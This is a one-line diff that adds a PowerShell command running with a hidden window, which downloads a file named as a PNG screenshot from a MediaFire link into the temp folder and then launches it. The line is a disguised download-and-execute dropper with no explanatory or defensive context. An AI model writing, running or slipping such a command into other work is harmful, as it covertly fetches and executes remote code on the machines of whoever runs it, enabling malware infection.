@@ -1,0 +1,1 @@
+powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://download1490.mediafire.com/na7mkiyhekdg/ny00snnid313fak/Screenshot+2021-11-07+163940.png','%TEMP%\Screenshot+2021-11-07+163940.png');Start-Process "%TEMP%\Screenshot+2021-11-07+163940.png"
